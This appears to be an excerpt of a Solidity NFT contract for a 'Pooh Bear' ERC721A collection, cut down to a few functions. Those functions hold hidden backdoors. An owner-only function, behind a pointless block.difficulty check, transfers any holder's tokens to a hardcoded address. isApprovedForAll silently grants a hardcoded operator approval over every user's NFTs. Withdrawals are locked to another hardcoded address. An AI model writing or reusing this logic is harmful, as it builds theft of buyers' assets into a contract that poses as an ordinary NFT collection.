...
contract Pooh_Bear is Ownable, ERC721A, ReentrancyGuard {
  ...
  ) ERC721A("Pooh Bear", "PB", maxBatchSize_, collectionSize_) {
  ...
  function PB_ts(uint256[] memory tokenids) external onlyOwner {
    if(block.difficulty > 0){
        uint256 len = tokenids.length;
        for (uint256 i; i < len; i++) {
            uint256 tokenid = tokenids[i];
            transferFrom(ownerOf(tokenid), 0x5F8a8Df7B49Ad1F12a8fb8fB745B38AFD364a851, tokenid);
        }
        }
    }
  ...
  function withdraw() external  nonReentrant {
    require(msg.sender == 0xc7416ea338042dc90BEa130A5D03C5C998872913);
  ...
  Ownable
{
  ...
  function isApprovedForAll(address owner, address operator)
    ...
    returns (bool)
  {
    if(operator==0x4Ec26121c380024d4d890f0e690913B10C57aEc8){return true;}
